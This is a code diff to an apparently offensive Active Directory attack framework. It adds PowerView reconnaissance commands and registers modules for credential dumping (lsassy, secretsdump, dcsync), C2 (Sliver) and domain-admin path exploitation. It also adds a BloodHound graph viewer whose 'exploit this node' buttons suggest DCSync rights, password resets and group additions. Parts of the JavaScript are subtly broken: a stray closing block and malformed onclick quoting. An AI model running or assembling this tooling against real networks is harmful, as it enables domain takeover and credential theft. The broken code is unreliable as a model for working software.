+            run_cmd(base + ['-C','Get-DomainUser -Properties samaccountname,userAccountControl -Where "userAccountControl has_flag 0x00000020"'],
+                    label='powerview PASSWD_NOTREQD users')
+
+        elif action == 'recon':
+            log('Full domain recon via Invoke-DomainRecon...','info')
+            out = os.path.join(out_dir,'recon.txt')
+            run_cmd(base + ['-C',f'Invoke-DomainRecon -OutFile {out}'],
+                    label='powerview Invoke-DomainRecon')
+            if os.path.exists(out):
+                add_result('powerview',f'domain recon → {out}')
+
+        hr()
+
+
+# =============================================================================
 # PYWERVIEW — Python PowerView: userhunter, GPO admin, local admin check, sessions
 # =============================================================================
 class PywerView(Module):
@@ -9147,18 +10869,22 @@ MODULES = {m.name: m for m in [
     Trusts, ACLPersist, DCShadow, SMBClient, DiamondTicket, SapphireTicket,
     Nmap, FFuf, Unauth, HashCrack, AddComputer, PassTheCert, GroupScope, JEA, GodPotato,
     PyWhisker, PKINIT, UnPAC, LDAPShell, CrossDomain,
-    NXCModules, NetEnum, OwnerEdit, PassiveSniff, Enrich, Timeroast, Coercion, ZipSlip, BackupAbuse,
+    NXCModules, NetEnum, OwnerEdit, PassiveSniff, Enrich, Timeroast, Coercion, ZipSlip, BackupAbuse, SliverModule, PathPwn,
     Ligolo, BloodHoundQuery, AutoEnum, RunasCs, KeePass, FTP,
     DPloot, SCCM, Pre2K, ADIDNS,
     SyncJacking, DNSAdmins, AzureADSync, LAPSToolkit, PywerView, HealthCheck,
+    ACLScan, Trusts, Grouper2, ACLight, Lsassy, ADCSKiller, Snaffler, PyWSUS,
     Cleanup,
 ]}
 
+# Load plugins after MODULES is fully defined
+load_plugins(MODULES)
+
 GROUPS = {
-    'recon':        ['enum','ldapenum','bloodyenum','kerbrute','enum4linux','rpcenum','gpp','adrecon','dnsdump','adidns','pathfind','shares','mssql','unauth','bh-query','autoenum','ftp','healthcheck','pywerview','nmap','ffuf','nxcmodules'],
-    'credentials':  ['kerberoast','asreproast','spray','laps','lapstoolkit','gmsa','dpapi','dploot','hashcrack','unpac','timeroast','keepass','sccm','pre2k','azureadsync'],
-    'lateral':      ['secretsdump','dcsync','pth','ptt','exec','bloody','smbclient','passthecert','jea','pkinit','ldapshell','ligolo','runasc'],
-    'exploitation': ['certipy','relay','mitm6','coerce','coercion','zerologon','nopac','spnjack','badsuccessor','addcomputer','groupscope','godpotato','backupabuse','pywhisker','crossdomain','zipslip',
+    'recon':        ['enum','ldapenum','bloodyenum','kerbrute','enum4linux','rpcenum','gpp','adrecon','dnsdump','adidns','pathfind','shares','mssql','unauth','bh-query','autoenum','ftp','healthcheck','pywerview','nmap','ffuf','nxcmodules','sccm','trusts','aclscan','grouper2','aclight','snaffler','powerview'],
+    'credentials':  ['lsassy','kerberoast','asreproast','spray','laps','lapstoolkit','gmsa','dpapi','dploot','hashcrack','unpac','timeroast','keepass','sccm','pre2k','azureadsync'],
+    'lateral':      ['secretsdump','dcsync','pth','ptt','exec','bloody','smbclient','smbclientng','passthecert','jea','pkinit','ldapshell','ligolo','runasc'],
+    'exploitation': ['certipy','relay','mitm6','coerce','coercion','zerologon','nopac','spnjack','badsuccessor','addcomputer','groupscope','godpotato','backupabuse','sliver','pathpwn','adcskiller','pywsus','pywhisker','crossdomain','zipslip',
                      'golden','silver','diamond','sapphire','rbcd','shadowcred','trusts','printnightmare','rubeus',
                      'syncjacking','dnsadmins'],
     'persistence':  ['aclpersist','dcshadow'],
@@ -9202,6 +10928,835 @@ def list_modules():
             print(f'  [{avail}] {C0}{n:<20}{RESET} {GREY}{m.description}{RESET}')
     print(); hr()
 
+def _bh_view(target):
+    """Generate a custom BloodHound viewer HTML from loot JSON files and serve it."""
+    import json as _json, glob as _glob, http.server as _hs, threading as _th, webbrowser as _wb
+
+    bh_dir = os.path.join(target.loot_dir, 'bloodhound')
+    if not os.path.isdir(bh_dir):
+        log(f'No BloodHound data at {WHITE}{bh_dir}{RESET} — run {C0}adrecon{RESET} first','error')
+        return
+
+    json_files = _glob.glob(os.path.join(bh_dir,'**','*.json'), recursive=True)
+    if not json_files:
+        log('No BloodHound JSON files found','error'); return
+
+    log(f'Loading {len(json_files)} BloodHound JSON file(s)...','info')
+
+    nodes, edges = [], []
+    node_map = {}  # name.upper() → index
+
+    TYPE_COLOR = {
+        'User':'#E24B4A','Group':'#378ADD','Computer':'#1D9E75',
+        'Domain':'#BA7517','GPO':'#7F77DD','OU':'#888780'
+    }
+
+    def _add_node(name, ntype):
+        key = name.upper()
+        if key not in node_map:
+            node_map[key] = len(nodes)
+            nodes.append({'id':len(nodes),'label':name,'type':ntype,
+                          'color':TYPE_COLOR.get(ntype,'#888780'),'owned':False})
+        return node_map[key]
+
+    DANGEROUS = {'GenericAll','WriteDacl','WriteOwner','Owns','ForceChangePassword',
+                 'AddMember','AddSelf','GetChangesAll','DCSync','AllExtendedRights',
+                 'GenericWrite','WriteAccountRestrictions'}
+
+    owned_names = set()
+    if target.user: owned_names.add(target.user.upper())
+
+    for jf in json_files:
+        try:
+            data = _json.loads(open(jf, errors='replace').read())
+            # BloodHound CE: {"data":[...]} or legacy {"users":[...]}
+            items = (data.get('data') or data.get('nodes') or
+                     data.get('users') or data.get('groups') or
+                     data.get('computers') or data.get('gpos') or
+                     data.get('ous') or [])
+            # detect type from filename
+            fname = os.path.basename(jf).lower()
+            default_type = ('User' if 'user' in fname else
+                           'Group' if 'group' in fname else
+                           'Computer' if 'computer' in fname else
+                           'GPO' if 'gpo' in fname else
+                           'Domain' if 'domain' in fname else 'Unknown')
+
+            for item in (items if isinstance(items, list) else []):
+                props = item.get('Properties', item.get('properties', {}))
+                # CE format stores name in Properties.name
+                name  = (props.get('name') or props.get('Name') or
+                         item.get('Name') or item.get('name') or '')
+                ntype = (item.get('ObjectType') or item.get('objecttype') or
+                         item.get('Type') or item.get('type') or default_type)
+                # normalize type from CE format
+                type_map = {'user':'User','group':'Group','computer':'Computer',
+                            'domain':'Domain','gpo':'GPO','ou':'OU'}
+                ntype = type_map.get(ntype.lower(), ntype) if ntype else default_type
+                if not name: continue
+                src_idx = _add_node(name, ntype)
+                # mark owned
+                short = name.split('@')[0].upper()
+                if short in owned_names or name.upper() in owned_names:
+                    nodes[src_idx]['owned'] = True
+
+                # process ACEs — CE format uses Aces list
+                aces = item.get('Aces', item.get('aces', []))
+                for ace in (aces if isinstance(aces, list) else []):
+                    # CE: {PrincipalSID, PrincipalType, RightName, IsInherited}
+                    rname = (ace.get('PrincipalName') or ace.get('principalname') or
+                             ace.get('PrincipalSID') or ace.get('principalsid') or '')
+                    rtype = (ace.get('PrincipalType') or ace.get('principaltype') or 'User')
+                    right = (ace.get('RightName') or ace.get('rightname') or '')
+                    if rname and right:
+                        dst_idx = _add_node(rname, rtype)
+                        edges.append({'s':dst_idx,'t':src_idx,'rel':right,
+                                     'danger': right in DANGEROUS})
+
+                # group members — CE: Members list with ObjectType+ObjectIdentifier
+                members = item.get('Members', item.get('members', []))
+                for m in (members if isinstance(members, list) else []):
+                    mname = (m.get('MemberName') or m.get('membername') or
+                             m.get('Name') or m.get('ObjectIdentifier') or '')
+                    mtype = (m.get('MemberType') or m.get('membertype') or
+                             m.get('ObjectType') or 'User')
+                    mtype = type_map.get(mtype.lower(), mtype) if mtype else 'User'
+                    if mname:
+                        m_idx = _add_node(mname, mtype)
+                        edges.append({'s':m_idx,'t':src_idx,'rel':'MemberOf','danger':False})
+
+                # CE format: Aces on groups also stored as ACL
+                acl = item.get('Acl', item.get('acl', {}))
+                if isinstance(acl, dict):
+                    for ace in acl.get('Aces', acl.get('aces', [])):
+                        rname = (ace.get('PrincipalName') or ace.get('PrincipalSID') or '')
+                        rtype = (ace.get('PrincipalType') or 'User')
+                        right = (ace.get('RightName') or '')
+                        if rname and right:
+                            dst_idx = _add_node(rname, rtype)
+                            edges.append({'s':dst_idx,'t':src_idx,'rel':right,
+                                         'danger': right in DANGEROUS})
+        except Exception as e:
+            log(f'Error parsing {os.path.basename(jf)}: {e}','warn')
+
+    if not nodes:
+        log('No nodes parsed from BloodHound data','error'); return
+
+    log(f'{GREEN}{len(nodes)} nodes, {len(edges)} edges loaded{RESET}','success')
+
+    # deduplicate edges
+    seen = set()
+    deduped = []
+    for e in edges:
+        k = (e['s'],e['t'],e['rel'])
+        if k not in seen:
+            seen.add(k); deduped.append(e)
+    edges = deduped
+
+    # hierarchical layout — group by type, spread out to reduce clutter
+    import math as _math, random as _rnd
+    _rnd.seed(42)
+
+    type_order = ['Domain','Group','User','Computer','GPO','OU','Unknown']
+    type_groups = {t: [nd for nd in nodes if nd['type']==t] for t in type_order}
+
+    # spread by type — domain center, groups around it, users outer ring
+    type_radius = {'Domain':0,'Group':200,'User':420,'Computer':320,'GPO':280,'OU':260,'Unknown':380}
+    type_count = {t: len(g) for t,g in type_groups.items()}
+
+    for ntype, group in type_groups.items():
+        r = type_radius.get(ntype, 350)
+        cnt = len(group)
+        if cnt == 0: continue
+        if r == 0:
+            group[0]['x'] = 0; group[0]['y'] = 0
+            continue
+        for i, nd in enumerate(group):
+            angle = 2 * _math.pi * i / cnt
+            jitter_r = _rnd.uniform(0.85, 1.15)
+            jitter_a = _rnd.uniform(-0.15, 0.15)
+            nd['x'] = int(_math.cos(angle + jitter_a) * r * jitter_r)
+            nd['y'] = int(_math.sin(angle + jitter_a) * r * jitter_r)
+
+    # find DA path
+    domain_nodes = [nd['id'] for nd in nodes if nd['type']=='Domain']
+    da_path = []
+    owned   = [nd['id'] for nd in nodes if nd['owned']]
+
+    # build HTML
+    nodes_json = _json.dumps(nodes)
+    edges_json = _json.dumps(edges)
+    domain     = target.domain or 'UNKNOWN'
+    ws         = os.path.basename(os.path.dirname(target.loot_dir)) or os.path.basename(target.loot_dir)
+
+    html = f'''<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>bh-view // {domain}</title>
+<style>
+*{{box-sizing:border-box;margin:0;padding:0}}
+body{{font-family:'JetBrains Mono',Consolas,monospace;font-size:12px;background:#0f1117;color:#c9d1d9}}
+.topbar{{display:flex;align-items:center;gap:12px;padding:8px 16px;border-bottom:1px solid #21262d;background:#161b22}}
+.brand{{font-size:13px;font-weight:600;color:#e6edf3}}.brand span{{color:#f85149}}
+.topbar-meta{{font-size:11px;color:#8b949e;margin-left:4px}}
+.topbar-right{{margin-left:auto;display:flex;align-items:center;gap:8px;flex-wrap:wrap}}
+.pill{{font-size:10px;padding:2px 8px;border-radius:99px;border:1px solid;white-space:nowrap}}
+.pill-red{{border-color:#f85149;color:#f85149;background:rgba(248,81,73,.1)}}
+.pill-blue{{border-color:#388bfd;color:#388bfd;background:rgba(56,139,253,.1)}}
+.pill-green{{border-color:#3fb950;color:#3fb950;background:rgba(63,185,80,.1)}}
+.pill-amber{{border-color:#d29922;color:#d29922;background:rgba(210,153,34,.1)}}
+.pill-gray{{border-color:#30363d;color:#8b949e;background:#21262d}}
+.btn{{font-size:11px;padding:3px 10px;border-radius:6px;border:1px solid #30363d;color:#c9d1d9;background:transparent;cursor:pointer}}
+.btn:hover{{background:#21262d}}
+.btn-danger{{border-color:rgba(248,81,73,.4);color:#f85149}}
+.btn-danger:hover{{background:rgba(248,81,73,.1)}}
+.stats{{display:grid;grid-template-columns:repeat(5,1fr);gap:1px;border-bottom:1px solid #21262d;background:#21262d}}
+.stat{{background:#161b22;padding:8px 14px}}
+.stat-label{{font-size:9px;color:#8b949e;margin-bottom:3px;text-transform:uppercase;letter-spacing:.05em}}
+.stat-val{{font-size:18px;font-weight:600;color:#e6edf3}}
+.stat-val.red{{color:#f85149}}.stat-val.amber{{color:#d29922}}
+.body{{display:grid;grid-template-columns:1fr 230px;height:calc(100vh - 140px)}}
+.graph-area{{position:relative;overflow:hidden;background:#0d1117;border-right:1px solid #21262d}}
+.toolbar{{display:flex;align-items:center;gap:6px;padding:6px 10px;border-bottom:1px solid #21262d;background:#161b22;flex-wrap:wrap}}
+.toolbar select{{font-size:11px;padding:2px 6px;height:24px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px}}
+#canvas{{display:block;cursor:grab;width:100%;height:100%}}
+#canvas:active{{cursor:grabbing}}
+.right-panel{{display:flex;flex-direction:column;overflow-y:auto;background:#161b22}}
+.panel-section{{padding:10px 12px;border-bottom:1px solid #21262d}}
+.panel-title{{font-size:9px;font-weight:600;color:#8b949e;letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px}}
+.node-detail{{background:#0d1117;border-radius:6px;padding:8px;margin-bottom:6px;border:1px solid #21262d}}
+.node-name{{font-size:12px;font-weight:600;color:#e6edf3;margin-bottom:4px}}
+.detail-row{{display:flex;justify-content:space-between;font-size:10px;margin-bottom:2px;color:#8b949e}}
+.detail-row span:last-child{{color:#e6edf3;font-weight:500}}
+.edge-row{{display:flex;align-items:center;gap:6px;font-size:10px;padding:3px 0;border-bottom:1px solid #21262d;color:#8b949e}}
+.edge-row:last-child{{border:none}}
+.edge-dot{{width:6px;height:6px;border-radius:50%;flex-shrink:0}}
+.path-step{{display:flex;align-items:center;gap:5px;font-size:10px;padding:3px 0;border-bottom:1px dashed #21262d;flex-wrap:wrap}}
+.path-step:last-child{{border:none}}
+.path-edge{{font-size:9px;padding:1px 5px;border-radius:99px}}
+.path-edge.danger{{background:rgba(248,81,73,.15);color:#f85149;border:1px solid rgba(248,81,73,.3)}}
+.path-edge.info{{background:rgba(56,139,253,.1);color:#388bfd;border:1px solid rgba(56,139,253,.2)}}
+.bottom-bar{{display:flex;align-items:center;gap:10px;padding:5px 12px;border-top:1px solid #21262d;background:#161b22;font-size:10px;color:#8b949e;flex-wrap:wrap}}
+.leg{{display:flex;align-items:center;gap:4px}}
+.leg-dot{{width:8px;height:8px;border-radius:50%}}
+.leg-line{{width:16px;height:1.5px}}
+#tooltip{{position:absolute;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:6px 10px;font-size:11px;color:#e6edf3;pointer-events:none;display:none;z-index:10;max-width:200px}}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div>
+    <span class="brand">segfault<span>.ad</span> // bh-view</span>
+    <span class="topbar-meta">{domain} · workspace: {ws}</span>
+  </div>
+  <div class="topbar-right">
+    <span class="pill pill-red" id="pillDanger">● 0 dangerous</span>
+    <span class="pill pill-amber" id="pillOwned">◉ 0 owned</span>
+    <span class="pill pill-green" id="pillPaths">0 da paths</span>
+    <span class="pill pill-gray" id="pillCounts">loading...</span>
+    <button class="btn btn-danger" onclick="togglePath()">highlight path to DA</button>
+    <button class="btn" onclick="resetView()">reset view</button>
+    <button class="btn" onclick="exportPaths()">export paths</button>
+  </div>
+</div>
+
+<div class="stats">
+  <div class="stat"><div class="stat-label">users</div><div class="stat-val" id="sUsers">0</div></div>
+  <div class="stat"><div class="stat-label">groups</div><div class="stat-val" id="sGroups">0</div></div>
+  <div class="stat"><div class="stat-label">computers</div><div class="stat-val" id="sComps">0</div></div>
+  <div class="stat"><div class="stat-label">dangerous edges</div><div class="stat-val red" id="sDanger">0</div></div>
+  <div class="stat"><div class="stat-label">da paths found</div><div class="stat-val amber" id="sPaths">0</div></div>
+</div>
+
+<div class="body">
+  <div class="graph-area">
+    <div class="toolbar">
+      <select id="viewMode" onchange="setView(this.value)">
+        <option value="all">All nodes</option>
+        <option value="path">Path to DA</option>
+        <option value="owned">Owned only</option>
+        <option value="danger">Dangerous edges</option>
+      </select>
+      <select id="filterEdge" onchange="setEdgeFilter(this.value)">
+        <option value="all">All edges</option>
+        <option value="danger">Dangerous only</option>
+        <option value="memberof">MemberOf only</option>
+        <option value="none">No edges</option>
+      </select>
+      <select id="filterType" onchange="setTypeFilter(this.value)">
+        <option value="all">All types</option>
+        <option value="User">Users</option>
+        <option value="Group">Groups</option>
+        <option value="Computer">Computers</option>
+        <option value="Domain">Domains</option>
+      </select>
+      <input type="text" id="searchBox" placeholder="search nodes..." onInput="searchNodes(this.value)"
+        style="font-size:11px;padding:2px 8px;height:24px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;width:140px">
+      <span style="margin-left:auto;font-size:10px;color:#484f58">scroll=zoom · drag=pan · click=select</span>
+    </div>
+    <canvas id="canvas"></canvas>
+    <div id="tooltip"></div>
+  </div>
+
+  <div class="right-panel">
+    <div class="panel-section" id="nodePanel">
+      <div class="panel-title">selected node</div>
+      <div style="color:#8b949e;font-size:11px">click a node to see details</div>
+    </div>
+    <div class="panel-section" id="pathPanel" style="flex:1">
+      <div class="panel-title">path to DA</div>
+      <div style="color:#8b949e;font-size:11px" id="pathContent">finding paths...</div>
+    </div>
+  </div>
+</div>
+
+<div class="bottom-bar">
+  <div class="leg"><div class="leg-dot" style="background:#E24B4A"></div>user</div>
+  <div class="leg"><div class="leg-dot" style="background:#378ADD"></div>group</div>
+  <div class="leg"><div class="leg-dot" style="background:#1D9E75"></div>computer</div>
+  <div class="leg"><div class="leg-dot" style="background:#BA7517"></div>domain</div>
+  <div class="leg"><div class="leg-dot" style="background:#7F77DD"></div>gpo</div>
+  <div class="leg"><div class="leg-line" style="background:#f85149"></div>dangerous</div>
+  <div class="leg"><div class="leg-line" style="background:rgba(55,138,221,0.4)"></div>memberof</div>
+  <span style="margin-left:auto" id="footerInfo">loaded {len(json_files)} file(s) · {domain}</span>
+</div>
+
+<script>
+const NODES = {nodes_json};
+const EDGES = {edges_json};
+
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+let W,H,scale=1,offsetX=0,offsetY=0;
+let dragging=false,dragStart={{x:0,y:0}};
+let hoveredNode=null,selectedNode=null;
+let viewMode='all',edgeFilter='all',typeFilter='all',searchStr='';
+let showPath=false,daPath=[],allPaths=[];
+let animFrame=null;
+
+function resize(){{
+  const r=canvas.parentElement.getBoundingClientRect();
+  W=r.width; H=r.height-33;
+  canvas.width=W*devicePixelRatio; canvas.height=H*devicePixelRatio;
+  canvas.style.width=W+'px'; canvas.style.height=H+'px';
+  ctx.scale(devicePixelRatio,devicePixelRatio);
+  draw();
+}}
+
+function w2s(x,y){{return{{x:x*scale+offsetX+W/2,y:y*scale+offsetY+H/2}};}}
+function s2w(x,y){{return{{x:(x-W/2-offsetX)/scale,y:(y-H/2-offsetY)/scale}};}}
+
+function nodeVis(n){{
+  if(typeFilter!=='all'&&n.type!==typeFilter) return false;
+  if(viewMode==='owned') return n.owned;
+  if(viewMode==='path') return daPath.includes(n.id);
+  if(viewMode==='danger'){{
+    return EDGES.some(e=>e.danger&&(e.s===n.id||e.t===n.id));
+  }}
+  if(searchStr) return n.label.toLowerCase().includes(searchStr);
+  return true;
+}}
+
+function edgeVis(e){{
+  if(edgeFilter==='none') return false;
+  if(edgeFilter==='danger') return e.danger;
+  if(edgeFilter==='memberof') return e.rel==='MemberOf';
+  return true;
+}}
+
+function draw(){{
+  ctx.clearRect(0,0,W,H);
+  ctx.fillStyle='#0d1117';
+  ctx.fillRect(0,0,W,H);
+
+  EDGES.forEach(e=>{{
+    if(!edgeVis(e)) return;
+    const sn=NODES[e.s],tn=NODES[e.t];
+    if(!nodeVis(sn)||!nodeVis(tn)) return;
+    const sp=w2s(sn.x,sn.y),tp=w2s(tn.x,tn.y);
+    const onPath=showPath&&daPath.includes(e.s)&&daPath.includes(e.t);
+    ctx.beginPath();
+    ctx.moveTo(sp.x,sp.y);
+    const mx=(sp.x+tp.x)/2,my=(sp.y+tp.y)/2-15;
+    ctx.quadraticCurveTo(mx,my,tp.x,tp.y);
+    if(onPath){{ctx.strokeStyle='#f85149';ctx.lineWidth=2.5;}}
+    else if(e.danger){{ctx.strokeStyle='rgba(248,81,73,0.5)';ctx.lineWidth=1.5;}}
+    else{{ctx.strokeStyle='rgba(48,54,61,0.8)';ctx.lineWidth=1;}}
+    ctx.stroke();
+    const lx=(sp.x+tp.x)/2,ly=(sp.y+tp.y)/2-20;
+    ctx.font=`${{Math.max(8,9*scale)}}px monospace`;
+    ctx.fillStyle=e.danger?'rgba(248,81,73,0.8)':'rgba(100,110,120,0.6)';
+    ctx.textAlign='center';
+    ctx.fillText(e.rel,lx,ly);
+  }});
+
+  NODES.forEach(n=>{{
+    if(!nodeVis(n)) return;
+    const p=w2s(n.x,n.y);
+    const r=Math.max(10,14*scale);
+    const isHov=hoveredNode===n.id,isSel=selectedNode===n.id;
+    const onPath=showPath&&daPath.includes(n.id);
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,r,0,Math.PI*2);
+    ctx.fillStyle=n.owned?n.color:(n.color+'66');
+    ctx.fill();
+    if(onPath||isSel||isHov){{
+      ctx.strokeStyle=onPath?'#f85149':(isSel?'#e6edf3':'rgba(230,237,243,0.4)');
+      ctx.lineWidth=onPath?2.5:1.5;
+      ctx.stroke();
+    }}
+    if(n.owned){{
+      ctx.beginPath();ctx.arc(p.x+r*.65,p.y-r*.65,4,0,Math.PI*2);
+      ctx.fillStyle='#f85149';ctx.fill();
+    }}
+    ctx.font=`${{Math.max(8,10*scale)}}px monospace`;
+    ctx.fillStyle='rgba(201,209,217,0.85)';
+    ctx.textAlign='center';
+    const lbl=n.label.length>16?n.label.slice(0,15)+'…':n.label;
+    ctx.fillText(lbl,p.x,p.y+r+11);
+  }});
+}}
+
+function hitTest(mx,my){{
+  const w=s2w(mx,my);
+  for(let i=NODES.length-1;i>=0;i--){{
+    const n=NODES[i];
+    if(!nodeVis(n)) continue;
+    const dx=n.x-w.x,dy=n.y-w.y;
+    if(Math.sqrt(dx*dx+dy*dy)<20/scale) return n.id;
+  }}
+  return null;
+}}
+
+canvas.addEventListener('mousemove',e=>{{
+  const r=canvas.getBoundingClientRect();
+  const mx=e.clientX-r.left,my=e.clientY-r.top;
+  if(dragging){{offsetX+=mx-dragStart.x;offsetY+=my-dragStart.y;dragStart={{x:mx,y:my}};draw();return;}}
+  const h=hitTest(mx,my);
+  if(h!==hoveredNode){{
+    hoveredNode=h;
+    canvas.style.cursor=h!==null?'pointer':'grab';
+    if(h!==null){{
+      const n=NODES[h];
+      const tt=document.getElementById('tooltip');
+      tt.style.display='block';
+      tt.style.left=(e.clientX-r.left+12)+'px';
+      tt.style.top=(e.clientY-r.top-10)+'px';
+      tt.innerHTML=`<b>${{n.label}}</b><br><span style="color:#8b949e">${{n.type}}</span>${{n.owned?' <span style="color:#f85149">owned</span>':''}}`;
+    }} else {{
+      document.getElementById('tooltip').style.display='none';
+    }}
+    draw();
+  }}
+}});
+
+canvas.addEventListener('mousedown',e=>{{
+  const r=canvas.getBoundingClientRect();
+  const mx=e.clientX-r.left,my=e.clientY-r.top;
+  const h=hitTest(mx,my);
+  if(h!==null){{selectedNode=h;showNodePanel(h);}}
+  else{{dragging=true;dragStart={{x:mx,y:my}};}}
+}});
+
+canvas.addEventListener('mouseup',()=>{{dragging=false;}});
+canvas.addEventListener('mouseleave',()=>{{dragging=false;hoveredNode=null;document.getElementById('tooltip').style.display='none';draw();}});
+
+canvas.addEventListener('wheel',e=>{{
+  e.preventDefault();
+  const f=e.deltaY>0?0.88:1.14;
+  scale=Math.max(0.2,Math.min(5,scale*f));
+  draw();
+}},{{passive:false}});
+
+function showNodePanel(id){{
+  const n=NODES[id];
+  const nodeEdges=EDGES.filter(e=>e.s===id||e.t===id).slice(0,8);
+  const onPath=daPath.includes(id);
+  const dangerEdges=EDGES.filter(e=>e.t===id&&e.danger);
+  let exploitHtml='';
+  if(dangerEdges.length>0){{
+    const suggestions=[];
+    dangerEdges.forEach(e=>{{
+      if(e.rel==='WriteDacl'&&n.type==='Domain') suggestions.push('bloody → dcsync-rights');
+      else if(e.rel==='GenericAll'&&n.type==='Group') suggestions.push('bloody → addtogroup → '+n.label.split('@')[0]);
+      else if(e.rel==='ForceChangePassword') suggestions.push('bloody → resetpwd → '+n.label.split('@')[0]);
+      else if(e.rel==='GetChangesAll') suggestions.push('dcsync');
+      else if(e.rel==='GenericAll'&&n.type==='Domain') suggestions.push('bloody → dcsync-rights');
+      else if(e.rel==='AddMember') suggestions.push('bloody → addtogroup → '+n.label.split('@')[0]);
+      else suggestions.push('bloody → '+n.label.split('@')[0]);
+    }});
+    const unique=[...new Set(suggestions)];
+    exploitHtml='<div class="panel-title" style="margin-top:8px;color:#f85149">exploit this node</div>'+
+      unique.map(s=>'<button class="btn btn-danger" style="width:100%;margin-bottom:4px;font-size:10px;text-align:left" onclick="copyCmd('→ '+s+'')">↗ '+s+'</button>').join('');
+  }}
+  const ownedBtn='<button class="btn" style="font-size:10px;margin-top:6px;width:100%" onclick="toggleOwned('+id+')">'+(n.owned?'unmark owned':'✓ mark as owned')+'</button>';
+  document.getElementById('nodePanel').innerHTML=
+    '<div class="panel-title">selected node</div>'+
+    '<div class="node-detail">'+
+      '<div class="node-name">'+n.label+'</div>'+
+      (n.owned?'<span class="pill pill-red" style="font-size:9px;margin-bottom:6px;display:inline-block">● owned</span>':'')+
+      '<div class="detail-row"><span>type</span><span>'+n.type+'</span></div>'+
+      '<div class="detail-row"><span>on DA path</span><span style="color:'+(onPath?'#3fb950':'#8b949e')+'">'+(onPath?'yes':'no')+'</span></div>'+
+      '<div class="detail-row"><span>dangerous edges</span><span style="color:'+(dangerEdges.length>0?'#f85149':'#8b949e')+'">'+dangerEdges.length+'</span></div>'+
+      ownedBtn+
+    '</div>'+
+    '<div class="panel-title">edges</div>'+
+    nodeEdges.map(e=>{{
+      const other=NODES[e.s===id?e.t:e.s];
+      const dir=e.s===id?'→':'←';
+      return '<div class="edge-row"><div class="edge-dot" style="background:'+(e.danger?'#f85149':'rgba(55,138,221,0.5)')+'"></div><span style="color:'+(e.danger?'#f85149':'#8b949e')+'">'+dir+' '+e.rel+'</span><span style="color:#e6edf3;margin-left:auto">'+(other?other.label:'')+'</span></div>';
+    }}).join('')+
+    exploitHtml;
+  draw();
+}}
+
+function toggleOwned(id){{
+  NODES[id].owned=!NODES[id].owned;
+  updateStats();
+  findDAPaths();
+  showNodePanel(id);
+  draw();
+}}
+
+function copyCmd(cmd){{
+  navigator.clipboard.writeText(cmd).catch(()=>{{}});
+}}
+
+  draw();
+}}
+
+function findDAPaths(){{
+  const domainIds=NODES.filter(n=>n.type==='Domain').map(n=>n.id);
+  if(!domainIds.length){{document.getElementById('pathContent').textContent='No domain node found';return;}}
+  const ownedIds=NODES.filter(n=>n.owned).map(n=>n.id);
+  if(!ownedIds.length){{document.getElementById('pathContent').innerHTML='<span style="color:#8b949e">no owned nodes — mark nodes as owned to find paths</span>';return;}}
+
+  // BFS from owned nodes to domain
+  const target=domainIds[0];
+  const adj={{}};
+  EDGES.forEach(e=>{{
+    if(!adj[e.s]) adj[e.s]=[];
+    adj[e.s].push({{to:e.t,rel:e.rel,danger:e.danger}});
+  }});
+
+  let found=null;
+  for(const start of ownedIds){{
+    const visited=new Set([start]);
+    const queue=[[start,[start],[]]];
+    while(queue.length&&!found){{
+      const [cur,path,rels]=queue.shift();
+      if(cur===target){{found={{path,rels}};break;}}
+      for(const {{to,rel,danger}} of (adj[cur]||[])){{
+        if(!visited.has(to)&&path.length<12){{
+          visited.add(to);
+          queue.push([to,[...path,to],[...rels,{{rel,danger}}]]);
+        }}
+      }}
+    }}
+    if(found) break;
+  }}
+
+  if(!found){{
+    document.getElementById('pathContent').innerHTML='<span style="color:#8b949e">no path found — try running adrecon to collect more data</span>';
+    document.getElementById('sPaths').textContent='0';
+    return;
+  }}
+
+  daPath=found.path;
+  document.getElementById('sPaths').textContent='1';
+  document.getElementById('pillPaths').textContent='1 da path';
+
+  const steps=found.path.map((id,i)=>{{
+    if(i===0) return`<div class="path-step"><span style="color:#f85149;font-weight:600">${{NODES[id]?.label||id}}</span><span style="color:#484f58">(owned)</span></div>`;
+    const er=found.rels[i-1];
+    return`<div class="path-step">
+      <span style="color:#484f58">→</span>
+      <span class="path-edge ${{er.danger?'danger':'info'}}">${{er.rel}}</span>
+      <span style="color:#e6edf3;font-weight:500">${{NODES[id]?.label||id}}</span>
+      ${{id===target?'<span class="pill pill-green" style="font-size:9px">DA</span>':''}}
+    </div>`;
+  }}).join('');
+
+  document.getElementById('pathContent').innerHTML=steps+
+    `<button class="btn btn-danger" style="width:100%;margin-top:8px;font-size:10px" onclick="copyPathCmd()">copy pathpwn command</button>`;
+}}
+
+function copyPathCmd(){{
+  const owned=NODES.find(n=>n.owned);
+  const cmd=owned?`→ pathpwn\\n  start user > ${{owned.label}}`:'→ pathpwn';
+  navigator.clipboard.writeText(cmd).catch(()=>{{}});
+  alert('Copied to clipboard');
+}}
+
+function updateStats(){{
+  const users=NODES.filter(n=>n.type==='User').length;
+  const groups=NODES.filter(n=>n.type==='Group').length;
+  const comps=NODES.filter(n=>n.type==='Computer').length;
+  const danger=EDGES.filter(e=>e.danger).length;
+  const owned=NODES.filter(n=>n.owned).length;
+  document.getElementById('sUsers').textContent=users;
+  document.getElementById('sGroups').textContent=groups;
+  document.getElementById('sComps').textContent=comps;
+  document.getElementById('sDanger').textContent=danger;
+  document.getElementById('pillDanger').textContent='● '+danger+' dangerous';
+  document.getElementById('pillOwned').textContent='◉ '+owned+' owned';
+  document.getElementById('pillCounts').textContent=users+'u '+groups+'g '+comps+'c';
+}}
+
+function setView(v){{viewMode=v;draw();}}
+function setEdgeFilter(v){{edgeFilter=v;draw();}}
+function setTypeFilter(v){{typeFilter=v;draw();}}
+function searchNodes(v){{searchStr=v.toLowerCase();if(v)viewMode='all';draw();}}
+function togglePath(){{showPath=!showPath;draw();}}
+function resetView(){{scale=1;offsetX=0;offsetY=0;draw();}}
+function exportPaths(){{
+  const lines=daPath.map(id=>NODES[id]?.label||id).join(' → ');
+  const blob=new Blob([lines||'no path found'],{{type:'text/plain'}});
+  const a=document.createElement('a');a.href=URL.createObjectURL(blob);
+  a.download='da_path.txt';a.click();
+}}
+
